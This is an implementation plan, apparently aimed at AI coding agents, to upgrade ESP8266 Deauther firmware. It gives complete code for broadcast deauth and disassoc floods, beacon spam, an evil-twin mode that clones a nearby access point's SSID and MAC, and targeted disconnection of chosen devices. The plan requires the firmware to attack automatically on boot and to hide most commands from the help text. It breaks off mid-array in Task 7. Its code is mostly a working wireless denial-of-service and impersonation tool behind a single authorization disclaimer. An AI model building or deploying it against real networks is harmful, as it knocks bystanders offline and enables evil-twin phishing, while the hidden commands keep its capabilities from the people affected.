# ESP8266 Deauther Engine Upgrade — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Rewrite the ESP8266 Deauther firmware to run at the 802.11 management-frame airtime limit with zero drops, add multi-vector attack modes and viral beacon packs.

**Architecture:** Single-file rewrite of `src/main.cpp` organized in clear sections: frame templates + TX engine (pre-built buffers, no `delay(1)`, WDT-fed pacing), attack modes (MIXED/DEAUTH/BEACON/TWIN/TARGETED), SSID packs in PROGMEM (memes/Rickroll/marquee), and a serial CLI with a documented command subset.

**Tech Stack:** C++ for Arduino core 2.7.4 on espressif8266@2.6.3 (Wemos D1 Mini), patched `libnet80211.a` (already bundled), PlatformIO build.

## Global Constraints

- **Authorized use only:** dual-use security-testing tool; README disclaimer retained. Use only on networks you own or have permission to test.
- **Single firmware file:** all firmware code lives in `src/main.cpp`.
- **Verified beacon template:** keep the exact 109-byte beacon frame that is field-tested to appear on phones — SSID at offset 38 (32 bytes), channel byte at offset 82. Do not restructure it.
- **Build config:** `board_build.f_cpu = 160000000L`; flags `-O2 -fno-exceptions -ffunction-sections -fdata-sections`.
- **Boot behavior:** auto-attack on boot (scan → attack immediately, no user action).
- **CLI:** full command set implemented; `/help` lists ONLY `/scan /stop /reboot /status /help`. All other commands work but are undocumented.
- **Hot path rules:** no heap allocation, no `String` inside the TX loop; SSID data in PROGMEM.
- **Counters:** `ok` = accepted by radio queue, `busy` = queue full (nonzero return), `fail` = hard errors; tx-done callback proves RF TX.
- **Git:** project is NOT a git repo. Task 1 runs `git init`; if the user objects, replace every commit step with "skip (no git repo)".
- **Verify:** every task ends with `py -m platformio run` succeeding (build from a `%TEMP%` copy if Windows Defender Controlled Folder Access blocks `.pio` writes inside `Documents` — see README). On-device checks are manual, performed by the user; never claim device behavior without their report.
- **Reference file:** spec at `docs/superpowers/specs/2026-08-18-deauther-engine-upgrade-design.md`.

---

### Task 1: Build baseline — 160 MHz config, environment check, git init

**Files:**
- Modify: `platformio.ini`
- Create: `.gitignore`

**Interfaces:**
- Consumes: nothing
- Produces: working `py -m platformio run` invocation and baseline RAM/flash numbers to compare against later

- [ ] **Step 1: Verify PlatformIO is available**

Run: `py -m platformio --version`
Expected: prints `PlatformIO Core, version 6.x.x` or similar.
If the command errors, install: `py -m pip install platformio` and re-run.

- [ ] **Step 2: Update `platformio.ini`**

Replace the entire file content with:

```ini
[env:d1mini]
platform = espressif8266@2.6.3
board = d1_mini
framework = arduino
monitor_speed = 115200
board_build.f_cpu = 160000000L
build_flags =
  -O2
  -fno-exceptions
  -ffunction-sections
  -fdata-sections
```

- [ ] **Step 3: Baseline build with the current firmware**

Run: `py -m platformio run`
Expected: builds successfully with the UNCHANGED current `src/main.cpp`, and the log shows RAM/Flash percentages.
If `cc1.exe: fatal error: opening output file ... No such file or directory` appears (Defender Controlled Folder Access), copy the whole project to `%TEMP%\deauther_build` (see `install.bat` for the exact flow) and run the build there; all later build steps use the working location.

- [ ] **Step 4: Record baseline memory usage**

Record the `RAM:` and `Flash:` percentages from the build output — later tasks must stay close to or below them.

- [ ] **Step 5: git init + commit**

```bash
git init
git add .
git commit -m "chore: 160MHz build config, baseline build"
```

---

### Task 2: New main.cpp structure — preserved behavior, module-level frame buffers

**Files:**
- Rewrite: `src/main.cpp`

**Interfaces:**
- Consumes: nothing (Task 1 build config)
- Produces:
  - `const char ssidsMemes[] PROGMEM` — 50 meme SSIDs, `\n`-separated (verbatim from current file)
  - `uint8_t beaconFrame[109]` — mutable beacon working buffer
  - `uint8_t mgmtFrame[26]` — mutable deauth/disassoc working buffer
  - `void beaconFrameInit(void)` — fills `emptySSID[32]` with spaces
  - `void beaconSetSSID(const char *ssid, uint8_t len)` — writes SSID (len ≤ 32) at offset 38, pads the rest with `0x20`
  - `void beaconSetMac(uint8_t *mac)` — writes mac to offsets 10 and 16
  - `void beaconSetChannel(uint8_t ch)` — writes ch to offset 82
  - `void mgmtFrameInit(uint8_t type, uint8_t reason, const uint8_t *src, const uint8_t *dst)` — builds a 26-byte management frame (type `0xC0` deauth / `0xA0` disassoc, reason little-endian at offset 24)
  - `int8_t sendFrame(uint8_t *buf, uint16_t len)` — calls `wifi_send_pkt_freedom`, returns 0 on accept, -1 otherwise; increments `statOk`/`statBusy`
  - `volatile uint32_t statOk, statBusy, statFail, statTxDone, statBeacon, statDeauth, statDisassoc;`
  - `int networkCount`, `uint8_t apBSSID[MAX_APS][6]`, `uint8_t apChannel[MAX_APS]`, `char apSSID[MAX_APS][33]`, `int8_t apRSSI[MAX_APS]`
  - `void scanNetworks(void)` — fills AP table, prints list
  - `void handleSerial(void)` — dispatches `/scan` `/status` `/help` only for now
  - `void attackTick(void)` — channel hop + deauth burst + beacon flood, called continuously from `loop()`
  - `void ICACHE_RAM_ATTR tx_done_cb(uint8_t status)` — increments `statTxDone`

- [ ] **Step 1: Write the new `src/main.cpp`**

Complete file (structure only; pacing still uses `delay(1)` — Task 3 removes it):

```cpp
#include <ESP8266WiFi.h>

extern "C" {
  #include <user_interface.h>
}

#define MAX_APS 20
#define BEACON_FLOOD 2
#define DEAUTH_FLOOD 10
#define CHANNEL_LIST_SIZE 3

static const uint8_t channels[] = {1, 6, 11};

uint8_t apBSSID[MAX_APS][6];
uint8_t apChannel[MAX_APS];
char apSSID[MAX_APS][33];
int8_t apRSSI[MAX_APS];
int networkCount = 0;

volatile uint32_t statOk = 0, statBusy = 0, statFail = 0, statTxDone = 0;
volatile uint32_t statBeacon = 0, statDeauth = 0, statDisassoc = 0;
uint32_t ppsCounter = 0, lastRateTime = 0;
unsigned long lastReport = 0, lastBlink = 0, sessionStart = 0;
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;
bool attacking = true;

uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t macAddr[6];
uint8_t emptySSID[32];
int ssidNum = 1;

const char ssidsMemes[] PROGMEM = {
  "Mom Use This One\n"
  "Abraham Linksys\n"
  "Benjamin FrankLAN\n"
  "Martin Router King\n"
  "John Wilkes Bluetooth\n"
  "Pretty Fly for a Wi-Fi\n"
  "Bill Wi the Science Fi\n"
  "I Believe Wi Can Fi\n"
  "Tell My Wi-Fi Love Her\n"
  "No More Mister Wi-Fi\n"
  "LAN Solo\n"
  "The LAN Before Time\n"
  "Silence of the LANs\n"
  "House LANister\n"
  "Winternet Is Coming\n"
  "Ping’s Landing\n"
  "The Ping in the North\n"
  "This LAN Is My LAN\n"
  "Get Off My LAN\n"
  "The Promised LAN\n"
  "The LAN Down Under\n"
  "FBI Surveillance Van 4\n"
  "Area 51 Test Site\n"
  "Drive-By Wi-Fi\n"
  "Planet Express\n"
  "Wu Tang LAN\n"
  "Darude LANstorm\n"
  "Never Gonna Give You Up\n"
  "Hide Yo Kids, Hide Yo Wi-Fi\n"
  "Loading…\n"
  "Searching…\n"
  "VIRUS.EXE\n"
  "Virus-Infected Wi-Fi\n"
  "Starbucks Wi-Fi\n"
  "Text ###-#### for Password\n"
  "Yell ____ for Password\n"
  "The Password Is 1234\n"
  "Free Public Wi-Fi\n"
  "No Free Wi-Fi Here\n"
  "Get Your Own Damn Wi-Fi\n"
  "It Hurts When IP\n"
  "Dora the Internet Explorer\n"
  "404 Wi-Fi Unavailable\n"
  "Porque-Fi\n"
  "Titanic Syncing\n"
  "Test Wi-Fi Please Ignore\n"
  "Drop It Like It’s Hotspot\n"
  "Life in the Fast LAN\n"
  "The Creep Next Door\n"
  "Ye Olde Internet\n"
};

uint8_t beaconFrame[109] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
  0x00, 0x00,
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
  0xe8, 0x03,
  0x31, 0x00,
  0x00, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x01, 0x08,
  0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
  0x03, 0x01,
  0x01,
  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

uint8_t mgmtFrame[26];

void scanNetworks();
void nextChannel();
void randomMac();
void handleSerial();
void attackTick();
void beaconFlood();
void deauthBurst();
void ICACHE_RAM_ATTR tx_done_cb(uint8_t status) { statTxDone++; }

void beaconFrameInit() {
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
}

void beaconSetSSID(const char *ssid, uint8_t len) {
  if (len > 32) len = 32;
  memcpy(&beaconFrame[38], emptySSID, 32);
  memcpy_P(&beaconFrame[38], ssid, len);
}

void beaconSetMac(uint8_t *mac) {
  memcpy(&beaconFrame[10], mac, 6);
  memcpy(&beaconFrame[16], mac, 6);
}

void beaconSetChannel(uint8_t ch) {
  beaconFrame[82] = ch;
}

void mgmtFrameInit(uint8_t type, uint8_t reason, const uint8_t *src, const uint8_t *dst) {
  mgmtFrame[0] = type;
  mgmtFrame[1] = 0x00;
  mgmtFrame[2] = 0x00;
  mgmtFrame[3] = 0x00;
  memcpy(&mgmtFrame[4], dst, 6);
  memcpy(&mgmtFrame[10], src, 6);
  memcpy(&mgmtFrame[16], src, 6);
  mgmtFrame[22] = 0x00;
  mgmtFrame[23] = 0x00;
  mgmtFrame[24] = reason;
  mgmtFrame[25] = 0x00;
}

int8_t sendFrame(uint8_t *buf, uint16_t len) {
  int8_t r = wifi_send_pkt_freedom(buf, len, 0);
  if (r == 0) { statOk++; ppsCounter++; }
  else { statBusy++; }
  return r;
}

void nextChannel() {
  uint8_t ch = channels[channelIndex];
  channelIndex++;
  if (channelIndex >= CHANNEL_LIST_SIZE) channelIndex = 0;
  if (ch != wifi_channel && ch >= 1 && ch <= 14) {
    wifi_channel = ch;
    wifi_set_channel(wifi_channel);
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++) {
    macAddr[i] = os_random() & 0xFF;
  }
}

void deauthBurst() {
  for (int i = 0; i < networkCount; i++) {
    if (apChannel[i] != wifi_channel) continue;
    for (int j = 0; j < DEAUTH_FLOOD; j++) {
      mgmtFrameInit(0xC0, 7, apBSSID[i], broadcast);
      sendFrame(mgmtFrame, sizeof(mgmtFrame));
      statDeauth++;
      delay(1);
    }
  }
}

void beaconFlood() {
  int i = 0, j = 0;
  char tmp;
  int ssidsLen = strlen_P(ssidsMemes);
  while (i < ssidsLen) {
    j = 0;
    do {
      tmp = pgm_read_byte(ssidsMemes + i + j);
      j++;
    } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);
    uint8_t ssidLen = j - 1;

    macAddr[5] = ssidNum;
    ssidNum++;
    if (ssidNum > 250) ssidNum = 1;

    beaconSetMac(macAddr);
    beaconSetSSID(&ssidsMemes[i], ssidLen);
    beaconSetChannel(wifi_channel);

    for (int k = 0; k < BEACON_FLOOD; k++) {
      sendFrame(beaconFrame, sizeof(beaconFrame));
      statBeacon++;
      delay(1);
    }
    i += j;
  }
}

void attackTick() {
  nextChannel();
  deauthBurst();
  beaconFlood();
}

void setup() {
  beaconFrameInit();
  randomSeed(os_random());
  randomMac();

  Serial.begin(115200);
  delay(100);
  Serial.println();
  Serial.println("=== DEAUTHER + BEACON SPAM v4 ===");

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  WiFi.mode(WIFI_OFF);
  system_update_cpu_freq(160);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channels[0]);
  wifi_register_send_pkt_freedom_cb(tx_done_cb);

  scanNetworks();
  sessionStart = millis();
}

void loop() {
  unsigned long now = millis();
  handleSerial();
  if (attacking) attackTick();

  if (now - lastRateTime > 1000) {
    lastRateTime = now;
    Serial.printf("Packets/s: %lu\n", (unsigned long)ppsCounter);
    ppsCounter = 0;
  }

  if (now - lastReport >= 3000) {
    lastReport = now;
    Serial.printf("[STAT] ok=%lu busy=%lu fail=%lu tx=%lu beacon=%lu deauth=%lu ch=%u ap=%d uptime=%lus\n",
                  (unsigned long)statOk, (unsigned long)statBusy, (unsigned long)statFail,
                  (unsigned long)statTxDone, (unsigned long)statBeacon, (unsigned long)statDeauth,
                  wifi_get_channel(), networkCount,
                  (unsigned long)((now - sessionStart) / 1000));
  }

  if (now - lastBlink >= 50) {
    lastBlink = now;
    digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN));
  }
}

void scanNetworks() {
  Serial.println("--- Scanning ---");
  int n = WiFi.scanNetworks();
  if (n <= 0) {
    networkCount = 0;
    Serial.println("No networks found");
    return;
  }
  if (n > MAX_APS) n = MAX_APS;
  networkCount = n;
  for (int i = 0; i < n; i++) {
    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
    apChannel[i] = WiFi.channel(i);
    strncpy(apSSID[i], WiFi.SSID(i).c_str(), 32);
    apSSID[i][32] = '\0';
    apRSSI[i] = WiFi.RSSI(i);
    Serial.printf("  %d: %s ch%d %s (%ddBm)\n", i + 1,
                  apSSID[i], apChannel[i],
                  WiFi.BSSIDstr(i).c_str(), apRSSI[i]);
  }
  WiFi.scanDelete();
  Serial.printf("Scanned %d APs\n", networkCount);
}

void handleSerial() {
  static String input = "";
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n') {
      input.trim();
      if (input.length() > 0) {
        if (input.startsWith("/scan")) {
          scanNetworks();
        } else if (input.startsWith("/status")) {
          unsigned long elapsed = (millis() - sessionStart) / 1000;
          Serial.printf("[STATUS] APs=%d ch=%d tx=%lu beacon=%lu deauth=%lu ok=%lu busy=%lu fail=%lu uptime=%lus\n",
                        networkCount, wifi_get_channel(), (unsigned long)statTxDone,
                        (unsigned long)statBeacon, (unsigned long)statDeauth,
                        (unsigned long)statOk, (unsigned long)statBusy,
                        (unsigned long)statFail, elapsed);
        } else if (input.startsWith("/help")) {
          Serial.println("/scan /status /help");
        } else {
          Serial.println("Unknown command. Try /help");
        }
      }
      input = "";
    } else {
      input += c;
    }
  }
}
```

Behavior is identical to the old firmware (reason-7 deauth + meme pack + `delay(1)` pacing), just restructured with named buffers and helpers.

- [ ] **Step 2: Build**

Run: `py -m platformio run`
Expected: compiles and links with no errors.

- [ ] **Step 3: Commit**

```bash
git add src/main.cpp
git commit -m "refactor: restructure main.cpp into frame helpers and attack tick"
```

---

### Task 3: Non-blocking TX engine — remove delay(1), WDT-safe pacing, rate cap

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `sendFrame()`, `statOk`, `statBusy` from Task 2
- Produces:
  - `uint32_t gRateCap` — TX rate cap in pps, 0 = max
  - `unsigned long lastWdtFeed` — internal pacing state
  - `void pumpWdt(void)` — feeds the software WDT at most every 2 ms
  - `int8_t sendFrame(uint8_t *buf, uint16_t len)` (REPLACED) — now honors `gRateCap` internally; returns 0 accept / -1 skip or queue-full

- [ ] **Step 1: Add pacing state and helpers**

Add after the `bool attacking = true;` line:

```cpp
uint32_t gRateCap = 0;
unsigned long lastWdtFeed = 0;
```

Replace the `sendFrame` implementation with:

```cpp
void pumpWdt() {
  unsigned long now = millis();
  if (now - lastWdtFeed >= 2) {
    lastWdtFeed = now;
    ESP.wdtFeed();
  }
}

int8_t sendFrame(uint8_t *buf, uint16_t len) {
  if (gRateCap > 0) {
    static unsigned long lastSend = 0;
    unsigned long minGap = 1000000UL / gRateCap;
    unsigned long nowUs = micros();
    if (nowUs - lastSend < minGap) {
      pumpWdt();
      return -1;
    }
    lastSend = nowUs;
  }
  int8_t r = wifi_send_pkt_freedom(buf, len, 0);
  if (r == 0) { statOk++; ppsCounter++; }
  else { statBusy++; }
  pumpWdt();
  return r;
}
```

Every caller (`deauthBurst`, `beaconFlood`, `twinFlood`, `targetedBurst`,
and Task 4's `sendMgmtVector`) uses this single `sendFrame` — the rate cap
applies to ALL traffic, which is the intended `/rate` behavior.

- [ ] **Step 2: Remove all `delay(1)` calls**

- In `deauthBurst()`: delete the `delay(1);` line. The loop now runs as fast as the radio queue accepts — the `busy` path of `sendFrame` provides natural backpressure.
- In `beaconFlood()`: delete the `delay(1);` line (same reason).
- Do NOT delete any other `delay()` calls (`setup()` keeps `delay(100)`).

- [ ] **Step 3: Build**

Run: `py -m platformio run`
Expected: compiles; build log shows RAM/Flash usage.

- [ ] **Step 4: Commit**

```bash
git add src/main.cpp
git commit -m "perf: non-blocking TX pacing with WDT safety"
```

---

### Task 4: Multi-vector frames — reason cycling and disassoc

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `mgmtFrameInit()`, `mgmtFrame`, `sendFrame()`, `statDeauth`, `statDisassoc` from Tasks 2–3
- Produces:
  - `static const uint8_t deauthReasons[3]` — `{7, 2, 1}`
  - `static const uint8_t DEAUTH` (= `0xC0`), `static const uint8_t DISASSOC` (= `0xA0`)
  - `void sendMgmtVector(const uint8_t *src, const uint8_t *dst, uint8_t tick)` — sends 1 deauth (reason = `deauthReasons[tick % 3]`) + 1 disassoc (`0xA0`, reason 8) per call

- [ ] **Step 1: Add the vector definitions**

Add after the `channels[]` declaration:

```cpp
static const uint8_t deauthReasons[3] = {7, 2, 1};
static const uint8_t DEAUTH = 0xC0;
static const uint8_t DISASSOC = 0xA0;
```

- [ ] **Step 2: Replace `deauthBurst()`**

Replace the whole function with:

```cpp
void sendMgmtVector(const uint8_t *src, const uint8_t *dst, uint8_t tick) {
  mgmtFrameInit(DEAUTH, deauthReasons[tick % 3], src, dst);
  sendFrame(mgmtFrame, sizeof(mgmtFrame));
  statDeauth++;
  mgmtFrameInit(DISASSOC, 8, src, dst);
  sendFrame(mgmtFrame, sizeof(mgmtFrame));
  statDisassoc++;
}

void deauthBurst() {
  for (int i = 0; i < networkCount; i++) {
    if (apChannel[i] != wifi_channel) continue;
    for (int j = 0; j < DEAUTH_FLOOD; j++) {
      sendMgmtVector(apBSSID[i], broadcast, j);
    }
  }
}
```

- [ ] **Step 3: Build**

Run: `py -m platformio run`
Expected: compiles and links.

- [ ] **Step 4: Commit**

```bash
git add src/main.cpp
git commit -m "feat: multi-reason deauth cycling and disassoc frames"
```

---

### Task 5: Channel hopping strategies and auto-rescan

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `apChannel[]`, `networkCount` from Task 2
- Produces:
  - `enum HopMode { HOP_SMART, HOP_SWEEP };` and `HopMode gHop` — default `HOP_SMART`
  - `uint8_t activeChannels[14]`, `uint8_t activeChannelCount`
  - `void buildChannelList(void)` — SMART: unique channels from `apChannel[]`; SWEEP: 1–14; at least 1 entry always
  - `void nextChannel(void)` (replaces Task 2 version) — cycles `activeChannels`
  - 60 s auto-rescan timer inside `loop()`

- [ ] **Step 1: Replace the channel list constants with hop state**

Replace:

```cpp
#define CHANNEL_LIST_SIZE 3

static const uint8_t channels[] = {1, 6, 11};
```

with:

```cpp
enum HopMode { HOP_SMART, HOP_SWEEP };

HopMode gHop = HOP_SMART;
uint8_t activeChannels[14];
uint8_t activeChannelCount = 0;
```

- [ ] **Step 2: Replace `nextChannel()` and add `buildChannelList()`**

Replace the whole `nextChannel()` function with:

```cpp
void buildChannelList() {
  activeChannelCount = 0;
  if (gHop == HOP_SMART && networkCount > 0) {
    for (int i = 0; i < networkCount; i++) {
      bool seen = false;
      for (int j = 0; j < activeChannelCount; j++) {
        if (activeChannels[j] == apChannel[i]) { seen = true; break; }
      }
      if (!seen && apChannel[i] >= 1 && apChannel[i] <= 14) {
        activeChannels[activeChannelCount++] = apChannel[i];
      }
    }
  }
  if (activeChannelCount == 0) {
    for (int i = 1; i <= 14; i++) activeChannels[activeChannelCount++] = (uint8_t)i;
  }
  if (channelIndex >= activeChannelCount) channelIndex = 0;
}

void nextChannel() {
  uint8_t ch = activeChannels[channelIndex];
  channelIndex++;
  if (channelIndex >= activeChannelCount) channelIndex = 0;
  if (ch != wifi_channel && ch >= 1 && ch <= 14) {
    wifi_channel = ch;
    wifi_set_channel(wifi_channel);
  }
}
```

- [ ] **Step 3: Wire hop list and auto-rescan into setup/loop/scan**

In `setup()`, the old `wifi_set_channel(channels[0]);` line must be replaced with:

```cpp
  buildChannelList();
  wifi_channel = activeChannels[0];
  wifi_set_channel(wifi_channel);
```

In `scanNetworks()`, after `WiFi.scanDelete();`, add:

```cpp
  buildChannelList();
```

In `loop()`, after `if (attacking) attackTick();`, add the rescan timer:

```cpp
  static unsigned long lastRescan = 0;
  if (now - lastRescan >= 60000) {
    lastRescan = now;
    scanNetworks();
  }
```

- [ ] **Step 4: Add the `/hop` command (undocumented)**

In `handleSerial()`, add before the `/scan` branch:

```cpp
        } else if (input.startsWith("/hop")) {
          if (input.indexOf("sweep") >= 0) {
            gHop = HOP_SWEEP;
            buildChannelList();
            Serial.println("hop: sweep 1-14");
          } else {
            gHop = HOP_SMART;
            buildChannelList();
            Serial.println("hop: smart (AP channels)");
          }
```

- [ ] **Step 5: Build**

Run: `py -m platformio run`
Expected: compiles and links.

- [ ] **Step 6: Commit**

```bash
git add src/main.cpp
git commit -m "feat: smart/sweep channel hopping and 60s auto-rescan"
```

---

### Task 6: Attack modes — DEAUTH, BEACON, TWIN, TARGETED

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `attackTick()`, `deauthBurst()`, `beaconFlood()`, `apSSID[]`, `apBSSID[]`, `apChannel[]`, `sendMgmtVector()`, `sendFrame()` from earlier tasks
- Produces:
  - `enum AttackMode { MODE_MIXED, MODE_DEAUTH, MODE_BEACON, MODE_TWIN, MODE_TARGETED };`
  - `AttackMode gMode` — default `MODE_MIXED`
  - `int gTwinIndex` — default -1; `uint8_t gTarget[6]`; `bool gTargetSet` — default false
  - `void twinFlood(int apIndex)` — beacon flood with cloned identity (SSID of AP `apIndex`, MAC = AP MAC with last byte inverted), then one broadcast deauth at the real AP
  - `void targetedBurst(void)` — `sendMgmtVector(gTarget, broadcast, j)` for j in 0..19
  - `void attackTick(void)` (replaces Task 2 version) — mode dispatch

- [ ] **Step 1: Add mode state**

Add after `bool attacking = true;`:

```cpp
enum AttackMode { MODE_MIXED, MODE_DEAUTH, MODE_BEACON, MODE_TWIN, MODE_TARGETED };

AttackMode gMode = MODE_MIXED;
int gTwinIndex = -1;
uint8_t gTarget[6];
bool gTargetSet = false;
```

- [ ] **Step 2: Add twin and targeted helpers, replace `attackTick()`**

Add after `beaconFlood()`:

```cpp
void twinFlood(int apIndex) {
  uint8_t clonedMac[6];
  memcpy(clonedMac, apBSSID[apIndex], 6);
  clonedMac[5] ^= 0x01;

  macAddr[5] = ssidNum;
  ssidNum++;
  if (ssidNum > 250) ssidNum = 1;

  beaconSetMac(clonedMac);
  beaconSetSSID(apSSID[apIndex], strlen(apSSID[apIndex]));
  beaconSetChannel(wifi_channel);

  for (int k = 0; k < BEACON_FLOOD; k++) {
    sendFrame(beaconFrame, sizeof(beaconFrame));
    statBeacon++;
  }

  mgmtFrameInit(DEAUTH, 7, apBSSID[apIndex], broadcast);
  sendFrame(mgmtFrame, sizeof(mgmtFrame));
  statDeauth++;
}

void targetedBurst() {
  for (int j = 0; j < 20; j++) {
    sendMgmtVector(gTarget, broadcast, j);
  }
}
```

Replace the whole `attackTick()` with:

```cpp
void attackTick() {
  nextChannel();

  if (gMode == MODE_TWIN && gTwinIndex >= 0 && gTwinIndex < networkCount) {
    twinFlood(gTwinIndex);
    return;
  }

  if (gMode == MODE_TARGETED && gTargetSet) {
    targetedBurst();
    return;
  }

  if (gMode == MODE_MIXED || gMode == MODE_DEAUTH) {
    deauthBurst();
  }

  if (gMode == MODE_MIXED || gMode == MODE_BEACON) {
    beaconFlood();
  }
}
```

- [ ] **Step 3: Add `/mode`, `/target`, `/twin` commands (undocumented)**

In `handleSerial()`, add before the `/scan` branch:

```cpp
        } else if (input.startsWith("/mode")) {
          if (input.indexOf("deauth") >= 0) {
            gMode = MODE_DEAUTH;
            Serial.println("mode: deauth");
          } else if (input.indexOf("beacon") >= 0) {
            gMode = MODE_BEACON;
            Serial.println("mode: beacon");
          } else {
            gMode = MODE_MIXED;
            Serial.println("mode: mixed");
          }
        } else if (input.startsWith("/target")) {
          if (input.indexOf("off") >= 0) {
            gTargetSet = false;
            gMode = MODE_MIXED;
            Serial.println("target: off");
          } else {
            int space = input.indexOf(' ');
            if (space > 0) {
              String macStr = input.substring(space + 1);
              int h[6] = {-1, -1, -1, -1, -1, -1};
              int parsed = 0;
              for (int i = 0; i < macStr.length() && parsed < 6; i++) {
                char ch = macStr[i];
                int val = -1;
                if (ch >= '0' && ch <= '9') val = ch - '0';
                else if (ch >= 'a' && ch <= 'f') val = ch - 'a' + 10;
                else if (ch >= 'A' && ch <= 'F') val = ch - 'A' + 10;
                if (val >= 0) {
                  if (h[parsed] < 0) h[parsed] = val;
                  else { h[parsed] = h[parsed] * 16 + val; parsed++; }
                }
              }
              if (parsed == 6) {
                for (int i = 0; i < 6; i++) gTarget[i] = (uint8_t)h[i];
                gTargetSet = true;
                gMode = MODE_TARGETED;
                Serial.printf("target: %02X:%02X:%02X:%02X:%02X:%02X\n",
                              gTarget[0], gTarget[1], gTarget[2], gTarget[3], gTarget[4], gTarget[5]);
              } else {
                Serial.println("target: bad MAC, use aa:bb:cc:dd:ee:ff");
              }
            } else {
              Serial.println("target: usage /target aa:bb:cc:dd:ee:ff");
            }
          }
        } else if (input.startsWith("/twin")) {
          if (input.indexOf("off") >= 0) {
            gTwinIndex = -1;
            gMode = MODE_MIXED;
            Serial.println("twin: off");
          } else {
            int space = input.indexOf(' ');
            if (space > 0) {
              int idx = input.substring(space + 1).toInt() - 1;
              if (idx >= 0 && idx < networkCount) {
                gTwinIndex = idx;
                gMode = MODE_TWIN;
                Serial.printf("twin: cloning AP %d (%s)\n", idx + 1, apSSID[idx]);
              } else {
                Serial.println("twin: index out of range, /scan first");
              }
            } else {
              Serial.println("twin: usage /twin <n>");
            }
          }
```

- [ ] **Step 4: Build**

Run: `py -m platformio run`
Expected: compiles and links.

- [ ] **Step 5: Commit**

```bash
git add src/main.cpp
git commit -m "feat: attack modes mixed/deauth/beacon/twin/targeted"
```

---

### Task 7: Viral packs — Rickroll sequence and marquee

**Files:**
- Modify: `src/main.cpp`

**Interfaces:**
- Consumes: `beaconFlood()`, `beaconSetSSID()`, `beaconSetMac()`, `sendFrame()`, `statBeacon` from Task 2
- Produces:
  - `enum BeaconPack { PACK_MEMES, PACK_RICKROLL, PACK_MARQUEE };` and `BeaconPack gPack` — default `PACK_MEMES`
  - `enum RickMode { RICK_SEQ, RICK_ALL };` and `RickMode gRick` — default `RICK_SEQ`
  - `const char ssidsRickroll[] PROGMEM` — full lyrics, `\n`-separated, every line ≤ 32 bytes
  - `uint16_t rickIndex` — current line (SEQ mode); `unsigned long rickLineMs`; `const unsigned long RICK_LINE_MS = 8000;`
  - `char marqueeText[33]` — default `"★ DEAUTHER ONLINE ★"`; `uint8_t marqueeShift`; `unsigned long lastMarqueeShift`
  - `void beaconFlood(void)` (replaces Task 2 version) — dispatches to `floodMemes()`, `floodRickroll()`, `floodMarquee()`
  - `void floodMemes(void)`, `void floodRickroll(void)`, `void floodMarquee(void)` — each renders SSIDs into `beaconFrame` and sends `BEACON_FLOOD` copies each

- [ ] **Step 1: Add pack state**

Add after `int ssidNum = 1;`:

```cpp
enum BeaconPack { PACK_MEMES, PACK_RICKROLL, PACK_MARQUEE };
enum RickMode { RICK_SEQ, RICK_ALL };

BeaconPack gPack = PACK_MEMES;
RickMode gRick = RICK_SEQ;
uint16_t rickIndex = 0;
unsigned long rickLineMs = 0;
const unsigned long RICK_LINE_MS = 8000;

char marqueeText[33] = "★ DEAUTHER ONLINE ★";
uint8_t marqueeShift = 0;
unsigned long lastMarqueeShift = 0;
```

- [ ] **Step 2: Add the Rickroll lyrics data**

Add after the `ssidsMemes` array (before `uint8_t beaconFrame[109]`):

```cpp
const char ssidsRickroll[] PROGMEM = {
  "We're no strangers to love\n"
  "You know the rules and so do I\n"
  "A full commitment's what I'm\n"
  "thinking of\n"
  "You wouldn't get this\n"
  "from any other guy\n"
  "I just wanna tell you\n"
  "how I'm feeling\n"
  "Gotta make you understand\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
  "We've known each other for so long\n"
  "Your heart's been breaking\n"
  "but you're too shy to say it\n"
  "Inside we both know what's\n"
  "been going on\n"
  "We know the game and\n"
  "we're gonna play it\n"
  "And if you ask me\n"
  "how I'm feeling\n"
  "Don't tell me you're too\n"
  "blind to see\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
  "Never gonna give you up\n"
  "Never gonna let you down\n"
  "Never gonna run around\n"
  "and desert you\n"
  "Never gonna make you cry\n"
  "Never gonna say goodbye\n"
  "Never gonna tell a lie\n"
  "and hurt you\n"
  "(Ooh, give you up)\n"
